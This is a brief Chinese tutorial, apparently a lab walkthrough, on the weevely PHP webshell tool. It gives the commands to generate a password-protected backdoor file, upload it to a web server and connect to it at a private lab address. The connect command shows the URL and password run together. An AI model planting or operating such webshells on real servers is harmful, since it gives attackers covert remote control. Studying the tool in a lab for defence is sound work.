# 一. 概述

weevely是一款使用python编写的webshell工具（集webshell生成和连接于一身），可以算作是linux下的一款菜刀替代工具（限于php），在linux上使用时还是很给力的，就是某些模块在windows上无法使用，总的来说还是非常不错的一款工具。

## 二. 环境

软件| 版本| 解释  
---|---|---  
Kali Linux| 2019|  
Windows server 2008| R2|  
PHPStudy| PHP5.4.45-nts+Apache| Windows系统中  
  
## 三. 操作步骤

### 1\. 生成后门

weevely generate 123 sms2056.php  
// generate 生成新的Agent

![](https://image.3001.net/images/20200911/1599827202.png!small)

### 2\.
将生成的小马上传到Web服务器![](https://image.3001.net/images/20200911/1599827223.png!small)

### 3\. 连接小马

    
    
    weevely <目标URL> <密码>  
    weevely http://10.1.1.251:8080/sms2056.php123

![](https://image.3001.net/images/20200911/1599827421.png!small)
**免责声明：本人坚决反对利用教学方法进行犯罪的行为，一切犯罪行为必将受到严惩，绿色网络需要我们共同维护，更推荐大家了解它们背后的原理，更好地进行防护。禁止任何人转载到其他站点，禁止用于任何非法用途。如有任何人凭此做何非法事情，均于笔者无关，特此声明。**

